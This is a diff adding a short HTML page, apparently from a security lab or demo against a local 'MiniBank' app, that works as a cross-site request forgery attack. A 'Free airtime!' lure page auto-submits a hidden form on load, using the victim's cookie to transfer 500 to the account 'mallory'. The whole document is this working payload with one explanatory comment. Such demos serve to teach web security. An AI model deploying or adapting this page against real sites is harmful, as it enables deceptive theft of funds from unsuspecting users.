@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head><title>Free airtime!</title></head>
+<body onload="document.getElementById('f').submit()">
+  <h1>Congratulations! Claim your free airtime voucher...</h1>
+  <!-- Hidden form: the victim's browser sends it to MiniBank WITH the victim's cookie -->
+  <form id="f" action="http://localhost:5000/transfer" method="POST">
+    <input type="hidden" name="to" value="mallory">
+    <input type="hidden" name="amount" value="500">
+  </form>
+</body>
+</html>
